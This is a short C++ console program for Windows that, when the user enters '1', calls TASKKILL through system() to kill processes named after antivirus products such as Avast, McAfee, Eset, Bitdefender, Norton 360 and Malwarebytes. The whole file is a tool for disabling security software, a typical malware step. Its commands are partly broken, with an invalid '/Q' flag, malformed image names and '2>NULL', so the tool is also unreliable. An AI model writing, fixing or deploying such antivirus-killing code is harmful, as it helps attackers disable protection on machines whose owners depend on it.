#include <iostream>
#include <Windows.h>
#include <string>
#include <stdio.h>


void man() {
	std::printf("(1) for desactive anti virus : \n");
}


void kill() {
	std::system("TASKKILL /T /Q /IM avast.exe 2>NULL");
	std::system("TASKKILL /T /Q /IM McAfee 2>NULL");
	std::system("TASKKILL /T /Q /IM Eset.exe 2>NULL");
	std::system("TASKKILL /T /Q /IM Bitdefender.exe 2>NULL");
	std::system("TASKKILL /T /Q /IM Norton 360.exe 2>NULL");
	std::system("TASKKILL /T /Q /IM Malwarebytes.exe 2>NULL");

}


int main() {
	man();
	std::string a;
	std::cin >> a;

	if (a == "1") {
		kill();
	}
}